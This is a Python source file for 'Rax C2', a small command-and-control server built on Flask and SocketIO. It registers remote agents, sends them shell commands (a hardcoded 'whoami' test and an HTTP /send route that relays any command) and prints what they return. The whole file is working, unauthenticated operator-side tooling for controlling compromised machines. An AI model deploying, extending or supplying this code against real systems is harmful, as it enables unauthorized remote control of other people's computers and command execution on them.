# === server.py ===
# This is the main server component for Rax C2.
# It uses Flask + Flask-SocketIO to handle agent connections, command distribution, and result collection.

from flask import Flask, request  # Flask for HTTP routes
from flask_socketio import SocketIO, emit  # SocketIO for real-time communication with agents
import pyfiglet

# --- ASCII Banner ---
# Banner for a Rax C2 Server file - ✅
ascii_banner = pyfiglet.figlet_format("Rax - C2 - Server")
print(ascii_banner)
print("By - @mello-io")
print("-" * 30) # Separator for readability

app = Flask(__name__)
socketio = SocketIO(app)  # Create a SocketIO server

agents = {}  # Dictionary to keep track of agents (agent_id : IP)
agent_sid = None  # Global var to store agent session ID

# --- Agent Registration --- ✅
@app.route('/register', methods=['POST'])
def register():
    # Called when an agent sends a POST request to register
    ip = request.remote_addr
    agent_id = request.json.get("id")
    agents[agent_id] = ip
    print(f"[+] Agent {agent_id} registered from {ip}")
    return {"status": "registered"}

# --- Getting data back from the agent - ✅
@socketio.on('exec_result')
def handle_result(data):
    # Handle incoming command output from the agent
    print(f"[Agent Output] {data['output']}")    

# Connecting with the agent - ✅
@socketio.on('connect')
def handle_connect():
    # Called when an agent connects
    global agent_sid
    agent_sid = request.sid
    print("[+] Agent connected:", agent_sid)

    # Test: send command directly to agent
    print("[+] Sending Hardcoded Test commands")
    socketio.emit('command', "whoami", room=agent_sid)
    # socketio.emit('command',"ipconfig",room=agent_sid)


# === HTTP Route to Send Commands ===

# === Single agent operation - ✅ ===
@app.route('/send', methods=['GET','POST'])
def send():
    global agent_sid
    data = request.get_json()
    cmd = data.get('cmd')

    print(f"[DEBUG] Incoming command via HTTP: {cmd}")
    print(f"[DEBUG] Current agent SID: {agent_sid}")

    if agent_sid:
        socketio.emit('command', cmd, room=agent_sid)
        print(f"[>] Sent command: {cmd} to agent {agent_sid}")
        return {"status": "command sent"}, 200
    else:
        return {"error": "Agent not found"}, 404

# === Multiple agent operation - ⚒️ Research & Develop ===



# --- Main Server Running on open 5000 port - Testing = ✅
if __name__ == "__main__":
    # Start the SocketIO server with SSL support - ⚠️
    # Make sure cert.pem and key.pem are in the same folder - Need additional research ⚒️⚠️
    socketio.run(app, host='0.0.0.0', port=5000)#, ssl_context=('cert.pem', 'key.pem'))
